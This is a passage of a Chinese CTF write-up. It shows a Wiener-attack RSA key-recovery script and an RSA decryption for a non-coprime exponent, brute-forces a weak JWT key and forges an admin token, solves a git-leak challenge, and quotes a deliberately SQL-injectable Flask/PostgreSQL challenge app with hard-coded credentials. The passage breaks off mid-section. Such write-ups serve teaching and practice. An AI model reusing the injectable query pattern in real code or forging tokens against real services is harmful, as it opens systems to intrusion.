class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算连分数</span></span><br><span class="line"><span class="string">    :param x: 分子</span></span><br><span class="line"><span class="string">    :param y: 分母</span></span><br><span class="line"><span class="string">    :return: 连分数列表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算传入列表最后的渐进分数</span></span><br><span class="line"><span class="string">    :param cf: 连分数列表</span></span><br><span class="line"><span class="string">    :return: 该列表最后的渐近分数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    numerator = <span class="number">0</span></span><br><span class="line">    denominator = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cf[::-<span class="number">1</span>]:</span><br><span class="line">        <span class="comment"># 这里的渐进分数分子分母要分开</span></span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> numerator, denominator</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用韦达定理解出pq，x^2−(p+q)∗x+pq=0</span></span><br><span class="line"><span class="string">    :param a:x^2的系数</span></span><br><span class="line"><span class="string">    :param b:x的系数</span></span><br><span class="line"><span class="string">    :param c:pq</span></span><br><span class="line"><span class="string">    :return:p，q</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)</span><br><span class="line">    <span class="keyword">return</span> (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getGradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算列表所有的渐近分数</span></span><br><span class="line"><span class="string">    :param cf: 连分数列表</span></span><br><span class="line"><span class="string">    :return: 该列表所有的渐近分数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    gf = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cf) + <span class="number">1</span>):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    <span class="keyword">return</span> gf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param e:</span></span><br><span class="line"><span class="string">    :param n:</span></span><br><span class="line"><span class="string">    :return: 私钥d</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    <span class="keyword">for</span> d, k <span class="keyword">in</span> gf:</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        p, q = solve_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e=<span class="number">11881209201971769960545703420363113088458113193917302081488139824023488466450534979302732775384261289951663819889383871283393435874567676058308730840994269996270426872346181095147425555870816458739259424057593858926773175930567718921307007595412152051860198768425341047243910648792204871486820556061229776758481253766707460244191508467315608593552402934008546939260075670480877521747770290966713971305116824304584455834311003344575523703742396038296944940442595094190044721224502492997055499840877943626918705332507414838517447739584296497147630049609284613069010147083669015648970926768008012325363050285133655831209</span></span><br><span class="line">n=<span class="number">130506917901757833500880656818230820111814896821558809911665070609238340634103350641776200339447972610494005145107335910027066209703279478749621714942522771203012251624129809835281668541767719703766910930322436841293254585077622914048546318552348193600182349920340961207838400472237841419251522129796103603763</span></span><br><span class="line">d=wienerAttack(e, n**<span class="number">2</span>)</span><br><span class="line">k = e * d - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r = k</span><br><span class="line">t = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = r // <span class="number">2</span></span><br><span class="line">    t += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> r % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">success = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">    g = random.randint(<span class="number">0</span>, n)</span><br><span class="line">    y = <span class="built_in">pow</span>(g, r, n)</span><br><span class="line">    <span class="keyword">if</span> y == <span class="number">1</span> <span class="keyword">or</span> y == n - <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        x = <span class="built_in">pow</span>(y, <span class="number">2</span>, n)</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">            success = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> x == n - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            y = x</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> success:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> success:</span><br><span class="line">    p = libnum.gcd(y - <span class="number">1</span>, n)</span><br><span class="line">    q = n // p</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;P: &#x27;</span> + <span class="string">&#x27;%s&#x27;</span> % p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Q: &#x27;</span> + <span class="string">&#x27;%s&#x27;</span> % q)</span><br><span class="line">    hash_result = hashlib.md5(<span class="built_in">str</span>(p + q).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&#x27;QLNU&#123;&#x27;</span> + hash_result.encode() + <span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Cannot compute P and Q&#x27;</span>)</span><br><span class="line">QLNU&#123;88a27758257b7c87174b6ea972a1b854&#125;</span><br></pre></td></tr></table></figure><h2 id="not-prime"><a href="#not-prime" class="headerlink" title="not_prime"></a>not_prime</h2><p>根据提示，e和phi不互素</p><p>原题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">m=bytes_to_long(<span class="string">b&#x27;xxxxxx&#x27;</span>)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">e= <span class="number">485</span></span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p= 90001590571628449882768356132693793320380710587438751445227717046797643492854890272077076028501400801674037970146456442693356333145725683391580452197350307034664396425412189131031945585055386833984609074633912616551061262531556612042816706715156941338165698736593509428548029187638818394121469201965625147221</span></span><br><span class="line"><span class="comment">#q= 105269145185972005922101600001495560536711004054072625220240025622162044045232737266024106976484532324266604741308149241323569573803457119996593779129028876049944017213001133943043835369146690600654256999505984093654055465044150981679096848362996982680425629145233824412870249754368525048882875131030178432721</span></span><br><span class="line"><span class="comment">#c= 4011466196771057453748051548070252889305829159014486083134296940977745797784900339093445458817425649129360677656834717166461191857503662276260763813274523589374268178658075412219913461626103952622745086746603503909555807801624176466958878038820537440624646031996479670501067595211298340535838371124894533011681024206320817178328457414141064757221298996098449657759602092816345597925775497162488952621217176091286174386154264803599820578496373057033647920530416431159596919698553375884228694958053211497272788860741443420407312773534728288229296432297638584262400238090812394095583427915756299194616536991896049110187</span></span><br></pre></td></tr></table></figure><p>利用脚本解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p= <span class="number">90001590571628449882768356132693793320380710587438751445227717046797643492854890272077076028501400801674037970146456442693356333145725683391580452197350307034664396425412189131031945585055386833984609074633912616551061262531556612042816706715156941338165698736593509428548029187638818394121469201965625147221</span></span><br><span class="line">q= <span class="number">105269145185972005922101600001495560536711004054072625220240025622162044045232737266024106976484532324266604741308149241323569573803457119996593779129028876049944017213001133943043835369146690600654256999505984093654055465044150981679096848362996982680425629145233824412870249754368525048882875131030178432721</span></span><br><span class="line">e= <span class="number">485</span></span><br><span class="line">c= <span class="number">4011466196771057453748051548070252889305829159014486083134296940977745797784900339093445458817425649129360677656834717166461191857503662276260763813274523589374268178658075412219913461626103952622745086746603503909555807801624176466958878038820537440624646031996479670501067595211298340535838371124894533011681024206320817178328457414141064757221298996098449657759602092816345597925775497162488952621217176091286174386154264803599820578496373057033647920530416431159596919698553375884228694958053211497272788860741443420407312773534728288229296432297638584262400238090812394095583427915756299194616536991896049110187</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当e约去公约数后与phi互素</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">p, q, e, c</span>):</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    t = gmpy2.gcd(e, phi)</span><br><span class="line">    d = gmpy2.invert(e // t, phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    msg = gmpy2.iroot(m, t)</span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br><span class="line">    <span class="keyword">if</span> msg[<span class="number">1</span>]:</span><br><span class="line">        (<span class="built_in">print</span>(long_to_bytes(msg[<span class="number">0</span>])))</span><br><span class="line"></span><br><span class="line">decrypt(p, q, e, c)</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NzMyOGI5ZGE4Y2U1YWYxNDkzZDZiOTQ3MjM4NTkzYmVfZ0tXS1RrVkVWcGU2eDVXUUhLaldHZ3g4NEpqcWwzMHVfVG9rZW46SEZXMmJtVG1IbzhQWGF4Q3R5bWNiSkR6bnpiXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;1f4154c0-9d88-4882-b41f-75ce14664c91&#125;</span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Myjwt"><a href="#Myjwt" class="headerlink" title="Myjwt"></a>Myjwt</h2><p>看提示</p><p>jwt是个啥</p><p>弱密钥</p><p>题目名字myjwt也是一个工具</p><p>这里使用<a href="https://jwt.io/">https://jwt.io/</a></p><p>利用myjwt工具，获得密码</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MDk5NDdkMzI5NDM4ZTFlY2QwODcwZThhNzA3MzhkNDBfM09Gb0Y4emlRdUVWcmVpQlFaaFR5M1RBYjNOSzhDUXVfVG9rZW46QTZTdmJvRHJvb0dJVk14ekVJaWNNZnFvbjFnXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>使用myjwt得到新的jwt，利用字典暴破得到密码为12345678</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YTliZjM0NzhhOWVhOTA5NDI3NzQ3MTQzNTE3YjlhODdfWk5uTG9qMUdCSmRpc3duajJ4RzZIamlZbTNjalFKZkZfVG9rZW46QTZ5RWJyZXlZb3ZoVEx4b0RKYWNuOU1lbkVjXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJleHAiOjE3NDI3MzA0MTF9.D6_ADIpgPto9XWtPKPqN17CX3x1NZ3_1VoEIDhmsbXY</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OWYyMTNkMTM2NTVmNjgwZThjNDA0YzQzY2FmYmIzMTVfN3FKNElENkY0WndUcjVQU1h6d3N2Wm4xZG9wSmc2V3JfVG9rZW46SUoxZGJ6Zm1ib3kxell4NHo5cWNFRWVBbmJjXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>将guest改为admin</p><p>密码为12345678</p><p>得到新的jwt：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE3NDI3MzA0MTF9.TNnlCu96PT8VmwGmzhmvcEiGDODVX7g_mu8B824rEKE</span><br></pre></td></tr></table></figure><p>再使用insomnia</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Yjg1Y2VkZTdiNzE4ZjQ2Mjg1ZmY3Y2I2YWZjZjkyNTdfNGJRZlZSSGhrQ3pETmlpZEhqdzhuUWFPRXhLOHBYZFRfVG9rZW46UUhDaGJZWFV2b1Q3T0V4dm0yR2M5N011bjJkXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8146d9bd-18d1-4512-bb44-c1a2dcf7d2f2&#125;</span><br></pre></td></tr></table></figure><h2 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h2><p>根据已知条件，题目网址为<a href="https://balabala.sky233.top/">https://balabala.sky233.top/</a></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OTk0ODBkNjFjNjNkYjNhYjU3MzVlZDBhMGQ0ZTIxOTBfR25JV3pPUmN4RGo5MTQ5WEJlT1pPWnBpRTJjRHRKOFZfVG9rZW46VGZEZWJNRDlsb2pUMGN4SFBoYWNzQWFRbmhmXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>输入<a href="https://balabala.sky233.top/robots.txt">https://balabala.sky233.top/robots.txt</a></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NTg1YzljYTllYzllYzk5ODJiZjUyZjA1NDBmNGE4Y2ZfNTVtRGtFUmlDUHZYUVh4ZnFqcjlmMTdLZFE0NmpsY01fVG9rZW46RkNSMWJMY3AxbzNtbWV4bUM4MmM4WHlWblVnXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>可以知道这道题目为git泄露 我是从虚拟机中解决的这道题</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MTU2NDQxOTc5ZjViNTVmNTEwZWU3MDllODI4YmJjNjNfS0dQdW1rSDIyMEdsZlRGT3VCeTdURFBQU3Ixd2dnc0tfVG9rZW46UUdJVWJLSnBNbzlybzF4OEFUZ2Mxd3BZbmdYXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;S1mpl3_g1t_AnD_sWp&#125;</span><br></pre></td></tr></table></figure><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>先看一下源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> cache</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> psycopg2</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag = Path(<span class="string">&quot;/app/f1aaaaaaggggggg&quot;</span>).read_text().strip()</span><br><span class="line"></span><br><span class="line">white_list = <span class="built_in">set</span>(<span class="string">&quot; &#x27;flag&#123;HeL10_W0rld&#125;&#x27;&quot;</span> + string.digits + string.ascii_letters+<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">black_list = [<span class="string">&quot;like&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@cache</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect_database</span>():</span><br><span class="line">    db_user = <span class="string">&quot;postgres&quot;</span></span><br><span class="line">    db_password = <span class="string">&quot;postgresql&quot;</span></span><br><span class="line">    db_host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line">    connection = psycopg2.connect(user=db_user, password=db_password, host=db_host)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> connection</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> app.app_context():</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    conn = connect_database()</span><br><span class="line">    create_sql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        DROP TABLE IF EXISTS company;</span></span><br><span class="line"><span class="string">        CREATE TABLE IF NOT EXISTS company (</span></span><br><span class="line"><span class="string">            name TEXT</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> sql:</span><br><span class="line">        sql.execute(create_sql)</span><br><span class="line">        sql.execute(<span class="string">&quot;SELECT COUNT(*) FROM company&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> sql.fetchall()[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            sql.execute(<span class="string">&quot;INSERT INTO company (name) VALUES (&#x27;ikun&#x27;)&quot;</span>)</span><br><span class="line">            sql.execute(<span class="string">&quot;INSERT INTO company (name) VALUES (&#x27;man&#x27;)&quot;</span>)</span><br><span class="line">            sql.execute(<span class="string">&quot;INSERT INTO company (name) VALUES (&#x27;%s&#x27;)&quot;</span> % (flag))</span><br><span class="line">        conn.commit()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/submit&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_form</span>():</span><br><span class="line">    conn = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        conn = connect_database()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> username:</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> white_list:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;你这名字有点奇怪emmm&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> forbidden_word <span class="keyword">in</span> black_list:</span><br><span class="line">            <span class="keyword">if</span> forbidden_word <span class="keyword">in</span> username.lower():</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;发现商业间谍，鸡毙你！！！&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> curr:</span><br><span class="line">            curr.execute(<span class="string">&quot;SELECT * FROM company WHERE name = &#x27;%s&#x27;&quot;</span> % username)</span><br><span class="line">            result = curr.fetchall()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;恭喜你，开启美好的一天吧&quot;</span>, <span class="number">200</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;你是新来的员工吗，我怎么不认识你&quot;</span>, <span class="number">201</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">if</span> conn <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            conn.commit()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;打卡机&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body style=&quot;background-image: url(/static/i_like_work.jpg)&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;a&gt;勤劳的打工人，请输入名字进行上班打卡&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;/submit&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;width: 80vw&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>根据提示</p><p>不是mysql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Postgresql</span><br></pre></td></tr></table></figure><p>打开实例后是这样的</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjBmZmU3Y2YyYTA0ZGJiYTFlNDU1OTVlOTM1OGJiZjFfbHlOak1idHFYMFBRZkFXWnViNTB6OUI2eXZKUlpkYUJfVG9rZW46THdrMWJnRnNkb1BTQXV4dlhBWGNRYzNMbnN4XzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><code>SIMILAR 